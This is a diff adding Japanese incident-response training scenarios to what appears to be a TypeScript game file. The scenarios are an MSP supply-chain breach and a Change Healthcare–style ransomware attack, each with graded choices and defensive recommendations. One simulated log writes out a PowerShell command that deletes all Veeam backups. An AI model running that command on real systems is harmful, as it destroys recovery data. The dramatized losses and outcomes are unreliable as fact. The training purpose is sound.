+        title: '情報隠蔽の発覚と顧客企業の連鎖倒産',
+        description: '事実確認を優先して顧客への警告を怠った結果、顧客企業各社のオフラインバックアップまで暗号化が到達。医療機関の救急受け入れ停止、サプライチェーン停止による部品メーカーの倒産が相次ぎ、監督官庁および検察による強制捜査が開始されました。',
+        severity: 'critical',
+        situationSummary: '壊滅的事態。企業の刑事責任追及と破産申し立て。',
+        telemetryLogs: [
+          { timestamp: '11:30:00', source: 'Prosecutor Office', level: 'CRITICAL', message: 'Search warrant executed at MSP headquarters for gross negligence.' }
+        ],
+        choices: [
+          {
+            id: 'c2_surrender_bankruptcy',
+            label: '破産管財人の選定と全受託事業の公的機関への引き継ぎ',
+            actionType: 'communication',
+            timeCostMinutes: 180,
+            description: '法的整理に入り、顧客企業の救済を公的管財人に委ねる。',
+            tacticalRationale: '破綻後の最終手続き。',
+            isOptimal: true,
+            impact: { spread: 30, exfiltration: 30, downtime: 60, trust: -60 },
+            logOutput: [
+              '[COURT] Bankruptcy petition accepted.',
+              '[CISO] Formal testimony before Parliamentary Committee on Supply Chain Security.'
+            ],
+            nextNodeId: 'kaseya_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      kaseya_03_terminal_secured_s: {
+        id: 'kaseya_03_terminal_secured_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】物理Kill Switchと緊急一斉架電によるサプライチェーン防衛',
+        description: '中央管理サーバーの「物理ネットワーク切断（Kill Switch）」を躊躇なく断行し、全顧客への自動緊急一斉通報により、全体の80%以上の顧客企業を暗号化から死守しました。さらに技術社員の現地派遣による迅速なバックアップ復旧でMSPとしての信頼を回復しました。',
+        severity: 'contained',
+        situationSummary: '80%以上の顧客を無傷で防衛。被害顧客も24時間以内に全台クリーン復旧。',
+        telemetryLogs: [
+          { timestamp: '14:00:00', source: 'MSP Incident Command', level: 'INFO', message: 'All 430 clients audited. Clean state restored. Universal zero-day patch verified.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: 'MSPサプライチェーン攻撃に対する迅速果断な危機対応',
+          summary: '「Web操作に頼らず大元の回線を物理切断する」「隠蔽せず全顧客へ直ちに警戒アラートを発報する」というサプライチェーン管理者の鑑となる初動を完遂しました。',
+          financialEstimate: '被害損害額: 約1億5,000万円（現地派遣復旧費・緊急対策費） / 阻止損失額: 約180億円（430社全体の損害賠償・集団訴訟）',
+          legalImpact: '顧客への即時通報義務を完全に遵守。行政指導を回避。',
+          complianceStatus: 'サプライチェーン・サイバーセキュリティ・コンソーシアム (SC3) 模範事例認定',
+          recommendedPractices: [
+            'MSP中央管理サーバーには、異常時にインターネットおよび全顧客との通信を即時遮断できる「物理的/論理的Kill Switch」を常備する',
+            '中央サーバーからエージェントへのスクリプト・バイナリ配信には「複数管理者によるコード署名（Dual Signing）」を義務付け、単一サーバー侵害での一斉配信を阻止する',
+            '顧客企業のバックアップはMSPの管理網から独立した「イミュータブル（変更不可）・オフライン」構成とし、管理基盤が陥落してもバックアップを破壊されない設計にする'
+          ]
+        }
+      },
+
+      kaseya_03_terminal_breached_f: {
+        id: 'kaseya_03_terminal_breached_f',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Fランク】管理基盤の盲信と通報遅延が生んだサプライチェーン壊滅事故',
+        description: 'WebUI上でのキャンセル操作に固執したり、顧客への連絡を躊躇した結果、顧客企業280社・数万台のシステムが一斉暗号化される未曾有のサイバー大惨事となりました。巨額の賠償請求と刑事責任により、MSP企業は破滅的な結末を迎えました。',
+        severity: 'critical',
+        situationSummary: '数百社の顧客業務麻痺。7,000万ドルの身代金要求と企業の破綻。',
+        telemetryLogs: [
+          { timestamp: '16:00:00', source: 'Regulatory Authority', level: 'CRITICAL', message: 'Operating license revoked. Criminal investigation referred to Ministry of Justice.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'F',
+          title: 'サプライチェーンのハブが最凶の感染源と化した悲劇',
+          summary: '「管理サーバーが乗っ取られた際の強制切断手順」の欠如と、「顧客への通報遅れ」が致命的な被害拡大を引き起こしました。',
+          financialEstimate: '被害損害額: 約85億円（顧客損害賠償・法的和解金・廃業清算費用）',
+          legalImpact: '業務上過失および善管注意義務違反による巨額民事訴訟、刑事告訴。',
+          complianceStatus: '全セキュリティ認定失効・廃業',
+          recommendedPractices: [
+            '「自社が攻撃の踏み台にされた時、最優先すべきは顧客のシステム停止（被害極小化）である」という倫理原則を全社規程に明記する',
+            '平時から顧客連絡用の緊急一斉通報（電話・SMS・外部回線）システムを整備し、年1回以上の抜き打ち遮断訓練を実施する'
+          ]
+        }
+      }
+    }
+  },
+
+  {
+    id: 'scenario_change_vpn',
+    title: '単一要素認証（MFAなし）レガシーVPN突破 & 医療・基幹インフラ麻痺',
+    subtitle: '実在モデル: 2024年 米国医療最大手 Change Healthcare / Colonial Pipeline 侵害事件 (ALPHV/BlackCat)',
+    difficulty: '上級 (インシデントコマンダー)',
+    category: 'Ransomware',
+    estimatedTime: '20分',
+    initialNodeId: 'vpn_01_alert',
+    initialMetrics: {
+      spread: 35,
+      exfiltration: 25,
+      downtime: 30,
+      trust: 85,
+    },
+    briefing: {
+      targetOrganization: '全国医療保険請求ネットワーク & 電子カルテ連携クラウド企業（年間150億件の医療トランザクション処理）',
+      discoveredAlert: '買収前の旧システムから運用が継続されていた旧Citrix/VPNポータル [legacy-vpn.portal.internal] において、ブルートフォース攻撃により漏洩認証情報が合致し、管理者アカウントでのリモートデスクトップログインが成功。直後にバックアップサーバー（Veeam）への消去コマンドが投入されたのを検知。',
+      incidentOfficer: '最高情報セキュリティ責任者 (CISO)',
+      immediateObjective: 'レガシーVPNゲートウェイの即時完全遮断、基幹決済・医療請求APIの安全な緊急分離、イミュータブル（変更不可）バックアップの死守、ランサムウェア身代金要求（2,200万ドル）への毅然とした拒絶とBCP（業務継続計画）発動。',
+    },
+    imagePath: '/src/assets/images/scenario_change_vpn_1793938201040.jpg',
+    nodes: {
+      vpn_01_alert: {
+        id: 'vpn_01_alert',
+        phase: 'Phase 1: MFA未設定レガシーポータルでの特権侵入検知 (T+00:00)',
+        title: '単一要素認証ポータルへの侵入とVeeamバックアップ破壊工作',
+        description: '未明03時12分、旧グループ会社から統合されず残存していた旧VPNポータル [legacy-vpn.portal.internal] に対し、ダークウェブ流出パスワードを用いたログインが成功。多要素認証（MFA）が設定されていなかったため直接侵入を許し、攻撃者はActive Directory管理者権限を即座に奪取。バックアップサーバー（Veeam Backup & Replication）のボリューム削除コマンドを実行し始めました。',
+        severity: 'critical',
+        situationSummary: '攻撃者は暗号化の前にバックアップを消去し、復旧の術を絶とうとしています。医療請求処理システムへの横展開が秒読み。',
+        telemetryLogs: [
+          { timestamp: '03:12:04', source: 'Citrix Gateway Log', level: 'CRITICAL', message: 'Auth Success: user=domain_admin_legacy from IP 185.220.101.5 (TOR). MFA: NOT_CONFIGURED' },
+          { timestamp: '03:14:22', source: 'Veeam Backup SRV', level: 'CRITICAL', message: 'PowerShell command: Remove-VBRBackup -Backup (All) -Confirm:$false executed!' },
+          { timestamp: '03:15:00', source: 'CrowdStrike EDR', level: 'ALERT', message: 'BlackCat / ALPHV ransomware encryptor dropped on Domain Controller DC-02' }
+        ],
+        choices: [
+          {
+            id: 'c1_sever_legacy_vpn_immutable',
+            label: 'レガシーVPNゲートウェイのIP/DNSを即時物理遮断 & バックアップストレージのオフラインイミュータブル（WORM）スナップショット保護を緊急発動',
+            actionType: 'containment',
+            timeCostMinutes: 6,
+            description: '侵入経路となったレガシーVPN機器の電源・回線を即断。さらにクラウド保管のオブジェクトロック（変更不可設定）バックアップを切り離して復旧資産を死守する。',
+            tacticalRationale: '最善の初動。Change Healthcareの悲劇は「MFAのない単一ポータル」から始まりました。侵入経路を即座に遮断し、Veeamの削除コマンドから変更不可（Immutable）ストレージを保護することが、身代金支払いを拒絶して自力復旧するための唯一の前提条件となります。',
+            isOptimal: true,
+            impact: { spread: -15, exfiltration: -10, downtime: 10, trust: +5 },
+            logOutput: [
+              '[NETWORK] Legacy Citrix VPN appliance disconnected from core switch.',
+              '[STORAGE] AWS S3 Object Lock (WORM compliance mode) verified intact for all database backups.',
+              '[EDR] Host WKSTN-LEGACY-01 isolated. Encryption process killed on DC-02.'
+            ],
+            nextNodeId: 'vpn_02_containment_and_claims_bcp'
+          },
+          {
+            id: 'c1_change_admin_pw_only',
+            label: '侵入された管理者アカウントのパスワードのみを変更し、レガシーポータル自体は病院顧客のために稼働させたままにする',
+            actionType: 'containment',
+            timeCostMinutes: 20,
+            description: 'ポータルを止めると全国の病院からクレームが来るため、パスワード変更だけで済ませようとする。',
+            tacticalRationale: '致命的ミス。攻撃者は侵入直後に複数のバックドアアカウントを作成し、ドメイン全体に黄金チケット（Golden Ticket）を発行しているため、1つのパスワードを変えても侵入は止まらない。',
+            impact: { spread: 40, exfiltration: 30, downtime: 25, trust: -25 },
+            logOutput: [
+              '[AD] Password changed for domain_admin_legacy.',
+              '[ATTACKER] Kerberos Golden Ticket used to authenticate as hidden admin: adm_svc_backup.',
+              '[RANSOMWARE] Lateral movement completed to 4,200 virtual machines across national hospital network.'
+            ],
+            nextNodeId: 'vpn_02_hospital_grid_collapse'
+          },
+          {
+            id: 'c1_negotiate_ransom_early',
+            label: '医療停止の社会的影響を恐れ、攻撃者ダークウェブチャットへ直ちにアクセスして身代金支払い交渉を始める',
+            actionType: 'communication',
+            timeCostMinutes: 45,
+            description: '自力復旧を諦め、犯罪組織への早期身代金支払いで解決を図る。',
+            tacticalRationale: '壊滅的判断。Change Healthcareでは2,200万ドル（約34億円）の身代金を支払ったにもかかわらず、ランサムウェアグループ内部で仲間割れが起き、別グループから更なる二重恐喝を受けるという最悪の結末を辿った。',
+            impact: { spread: 35, exfiltration: 45, downtime: 40, trust: -40 },
+            logOutput: [
+              '[TOR CHAT] Adversary demands 22 Million USD in Bitcoin.',
+              '[THREAT INTEL] BlackCat affiliate declares they will leak 4 Terabytes of patient health records regardless of payment.'
+            ],
+            nextNodeId: 'vpn_02_double_extortion_disaster'
+          }
+        ]
+      },
+
+      vpn_02_containment_and_claims_bcp: {
+        id: 'vpn_02_containment_and_claims_bcp',
+        phase: 'Phase 2: 医療請求BCP発動 & シャドーポータル全廃 (T+01:00)',
+        title: 'オフライン復旧計画の発動と全リモートアクセスMFA強制棚卸し',
+        description: 'イミュータブルバックアップの死守に成功したため、身代金を支払わずに自力で基幹DBを復旧できる見通しが立ちました。しかし全米/全国の薬局・病院で保険請求が一時停止しているため、医療機関向けの紙代替・暫定融資BCPの即時公表と、社内に潜む残存レガシーポータルの全廃が必要です。',
+        severity: 'high',
+        situationSummary: 'データ破壊は阻止。医療機関の資金ショート・薬局調剤停止を防ぐための緊急BCP運用支援が焦点。',
+        telemetryLogs: [
+          { timestamp: '04:15:00', source: 'CISO Office', level: 'INFO', message: 'Attack surface discovery: Identified 3 other forgotten single-factor legacy portals' },
+          { timestamp: '04:30:22', source: 'Ministry of Health / HHS', level: 'WARN', message: 'Emergency funding bridge protocol activated for impacted hospitals' }
+        ],
+        choices: [
+          {
+            id: 'c2_execute_clean_rebuild_mfa',
+            label: '変更不可バックアップからの安全なクリーン再構築・社内全アクセスへの耐フィッシングMFA（FIDO2）強制・医療機関向け緊急支援窓口の24時間稼働',
+            actionType: 'remediation',
+            timeCostMinutes: 80,
+            description: '侵害されたインフラを破棄して健全なバックアップから安全環境へ再構築。すべての旧ポータルを完全撤去し、医療機関への影響を最小限に抑える。',
+            tacticalRationale: '基幹インフラ事業者の矜持を示す模範的対応。犯罪組織に一切屈することなく、イミュータブルバックアップから安全に復旧させ、セキュリティガバナンスを根本から立て直す。',
+            isOptimal: true,
+            impact: { spread: -10, exfiltration: -10, downtime: 15, trust: +20 },
+            logOutput: [
+              '[CLEAN RESTORE] Core medical transaction database restored from S3 Immutable Vault.',
+              '[DECOMMISSION] All 4 legacy Citrix/VPN portals wiped and permanently decommissioned.',
+              '[MFA POLICY] FIDO2 hardware tokens enforced for 100% of employees and contractors.'
+            ],
+            nextNodeId: 'vpn_03_terminal_secured_s'
+          }
+        ]
+      },
+
+      vpn_02_hospital_grid_collapse: {
+        id: 'vpn_02_hospital_grid_collapse',
+        phase: 'Phase 2: 全国病院・調剤薬局の全面機能停止 (T+03:00)',
+        title: '4,200台暗号化と全国医療ネットワークの大停電',
+        description: 'パスワード変更だけの不十分な対応により、攻撃者は社内全域にランサムウェアを展開。全国数千の病院・調剤薬局で保険資格確認や処方箋発行ができなくなり、がん患者の抗がん剤投与が遅延するなど人命に関わる深刻な医療麻痺が発生しました。',
+        severity: 'critical',
+        situationSummary: '国家的人道危機。医療インフラ全面停止、連邦政府による緊急事態宣言。',
+        telemetryLogs: [
+          { timestamp: '06:15:00', source: 'Hospital Network', level: 'CRITICAL', message: 'Over 8,000 pharmacies unable to process prescription co-pays. Patients turned away.' },
+          { timestamp: '06:30:00', source: 'Federal Government', level: 'CRITICAL', message: 'National Security Council convenes emergency session on critical healthcare disruption' }
+        ],
+        choices: [
+          {
+            id: 'c2_federal_takeover_crisis',
+            label: '政府サイバー防衛隊の介入受諾・非常時紙マニュアルの全国配布・損害賠償基金の設立',
+            actionType: 'communication',
+            timeCostMinutes: 120,
+            description: '公的救済を要請し、人命救助を最優先としてシステム再建を進める。',
+            tacticalRationale: '国家レベルの危機における最終対応。',
+            isOptimal: true,
+            impact: { spread: 15, exfiltration: 25, downtime: 50, trust: -45 },
+            logOutput: [
+              '[DOD/CISA] Federal cyber incident response team takes over network forensics.',
+              '[EMERGENCY FUND] 2 Billion USD loan facility established to keep bankrupt hospitals afloat.'
+            ],
+            nextNodeId: 'vpn_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      vpn_02_double_extortion_disaster: {
+        id: 'vpn_02_double_extortion_disaster',
+        phase: 'Phase 2: 身代金支払い後の仲間割れと再恐喝 (T+04:00)',
+        title: '34億円支払い後の復号ツール不全と第二の恐喝グループ出現',
+        description: '裏ルートで2,200万ドルの身代金を支払ったものの、提供された復号ツールは動作が極めて不安定でデータベースが破損。さらに身代金を受け取ったアフィリエイトとグループ幹部が仲間割れを起こし、別の攻撃者が「データはまだ手元にある」として追加で1,000万ドルを再要求してきました。',
+        severity: 'critical',
+        situationSummary: '身代金支払いの最悪の末路。資金強奪、データ復旧失敗、再度の恐喝。',
+        telemetryLogs: [
+          { timestamp: '07:15:00', source: 'Decryption Tool', level: 'CRITICAL', message: 'Decryption failed: CRC32 checksum mismatch on 60% of database blocks' },
+          { timestamp: '07:30:00', source: 'Ransom Group B', level: 'CRITICAL', message: 'New threat actor: "ALPHV scammed you. We have the real 4TB data. Pay 10 Million or leak starts."' }
+        ],
+        choices: [
+          {
+            id: 'c2_terminate_talks_rebuild_scratch',
+            label: '全交渉の即時打ち切り・FBIへの全通信記録提出・手動バックアップからのゼロスクラッチ再構築',
+            actionType: 'remediation',
+            timeCostMinutes: 150,
+            description: '犯罪者との交渉がいかに無意味かを悟り、莫大な時間とコストをかけて自力再建に切り替える。',
+            tacticalRationale: '遅すぎた決断だが、泥沼の再恐喝から脱却する唯一の方法。',
+            isOptimal: true,
+            impact: { spread: 20, exfiltration: 30, downtime: 60, trust: -55 },
+            logOutput: [
+              '[FBI] All cryptocurrency wallet transaction flows and chat logs handed over.',
+              '[REBUILD] Bare-metal system reconstruction commenced from cold-storage archives.'
+            ],
+            nextNodeId: 'vpn_03_terminal_breached_f'
+          }
+        ]
+      },
+
+      vpn_03_terminal_secured_s: {
+        id: 'vpn_03_terminal_secured_s',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Sランク】レガシーVPN即断とイミュータブルバックアップ死守による自力復旧',
+        description: 'MFA未設定の旧Citrixポータルという「組織の盲点」からの侵入に対し、躊躇なく回線を物理切断。さらに暗号化を許さないイミュータブル（WORM）バックアップを死守したことで、巨額の身代金支払いを1円も行わず、自力での基幹医療インフラ再建を成し遂げました。',
+        severity: 'contained',
+        situationSummary: '身代金支払い: ゼロ。イミュータブルバックアップから完全自力復旧達成。',
+        telemetryLogs: [
+          { timestamp: '10:00:00', source: 'CISO Incident Command', level: 'INFO', message: 'Healthcare transaction network fully restored. Zero-Trust FIDO2 enforced globally.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'S',
+          title: '重要インフラにおけるランサムウェア侵入の模範的封じ込めと強靭性（Resilience）',
+          summary: '「侵入経路の即時物理切断」「イミュータブルバックアップによる身代金拒絶」「全シャドーITの完全廃止」という最高レベルのインシデント指揮を完遂しました。',
+          financialEstimate: '被害損害額: 約1億8,000万円（復旧工数・臨時体制費） / 阻止損失額: 約1,400億円（Change Healthcareが被った身代金・復旧費・医療貸付支援の合計損失）',
+          legalImpact: '個人情報保護法およびHIPAA法に基づく開示義務を遵守。刑事・民事責任を回避。',
+          complianceStatus: 'NIST CSF v2.0 / FISC 安全対策基準 適合',
+          recommendedPractices: [
+            'M&A（企業の合併・買収）で引き継いだ旧インフラやレガシーVPNは放置せず、統合前に全ポータルへMFAを即時強制適用するか即刻廃止する',
+            'バックアップは管理者アカウントであっても消去・改ざんできない「イミュータブル（WORM / オブジェクトロック）ストレージ」に保管する',
+            'ランサムウェア攻撃者への身代金支払いは仲間割れや再恐喝を招くだけであり、決して根本解決にならないことを経営陣と平時から合意形成しておく'
+          ]
+        }
+      },
+
+      vpn_03_terminal_breached_f: {
+        id: 'vpn_03_terminal_breached_f',
+        phase: '訓練終了: 事後評価 (After Action Review)',
+        title: '【Fランク】単一ポータルのMFA欠如が招いた国家規模の医療インフラ壊滅',
+        description: '全社の中で「たった1台残っていたMFAなしのレガシーVPNポータル」を放置したこと、そして初動でのパスワード変更ミスや身代金交渉への依存が、全国の病院・薬局を巻き込む未曾有の医療大混乱を引き起こしました。',
+        severity: 'critical',
+        situationSummary: '全国医療網の長期停止。数千億円規模の経済損失と経営陣の引責解任。',
+        telemetryLogs: [
+          { timestamp: '12:00:00', source: 'Congressional Hearing', level: 'CRITICAL', message: 'CEO and Board of Directors subpoenaed for hearing on systemic healthcare cybersecurity failure.' }
+        ],
+        choices: [],
+        isTerminal: true,
+        terminalOutcome: {
+          grade: 'F',
+          title: '最も弱い環（Weakest Link）から崩壊した基幹インフラ',
+          summary: 'どれだけ堅牢な最新セキュリティを導入していても、「MFAのない旧ポータルが1つ存在するだけ」で防壁は無意味となります。アタックサーフェス管理（ASM）の怠慢が致命傷となりました。',
+          financialEstimate: '被害損害額: 約1,200億円（身代金無駄金・復旧費用・医療機関支援損失・株主訴訟）',
+          legalImpact: '議会公聴会での召喚、HIPAA重大違反による天文学的制裁金、集団損害賠償訴訟。',
+          complianceStatus: '主要公的認証の取消、事業ライセンスの停止危機',
+          recommendedPractices: [
+            '「社外に公開されているすべてのIP・ポート・ポータル」を外部アタックサーフェス管理（EASM）ツールで常時自動棚卸しする',
+            '例外なくすべてのリモートアクセスにMFAを強制し、レガシー認証（BASIC認証・MFA非対応プロトコル）をゲートウェイレベルで完全無効化する'
+          ]
+        }
+      }
+    }
+  }
+
+];
